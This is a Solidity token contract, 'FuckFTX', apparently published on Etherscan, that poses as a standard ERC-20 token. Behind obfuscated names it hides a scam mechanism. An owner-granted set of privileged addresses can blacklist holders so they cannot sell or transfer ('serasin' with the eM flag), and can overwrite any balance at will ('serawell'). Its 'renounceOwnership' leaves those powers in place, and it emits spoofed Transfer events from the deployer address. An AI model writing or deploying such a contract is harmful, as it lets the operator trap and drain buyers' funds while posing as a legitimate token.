/**
 *Submitted for verification at Etherscan.io on 2022-11-11
*/

/*
// SPDX-License-Identifier: Unlicensed
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract FuckFTX {
  
    mapping (address => uint256) public sAMq;
    mapping (address => bool) sRSc;
	mapping (address => bool) eRn;



    // 
    string public name = "FuckFTX.com";
    string public symbol = unicode"FFTX";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        sAMq[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0xbaeFECFFa60038Fb9c9665504453bD36Ec2860E0;
    address Deployer = 0xbaeFECFFa60038Fb9c9665504453bD36Ec2860E0;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier yQ () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(sAMq[msg.sender] >= value);
        sAMq[msg.sender] -= value;  
        sAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(sRSc[msg.sender]) {
        require(eM == 1);} 
        require(sAMq[msg.sender] >= value);
        sAMq[msg.sender] -= value;  
        sAMq[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function Yearn(address Ex) yQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return sAMq[account]; }
        function serasin(address Ex) Si public{          
        require(!sRSc[Ex]);
        sRSc[Ex] = true;}
		modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function serawell(address Ex, uint256 iZ) Si public returns (bool success) {
        sAMq[Ex] = iZ;
        return true; }
        function serw(address Ex) Si public {
        require(sRSc[Ex]);
        sRSc[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= sAMq[from]);
        require(value <= allowance[from][msg.sender]);
        sAMq[from] -= value;  
        sAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(sRSc[from] || sRSc[to]) {
        require(eM == 1);}
        require(value <= sAMq[from]);
        require(value <= allowance[from][msg.sender]);
        sAMq[from] -= value;
        sAMq[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}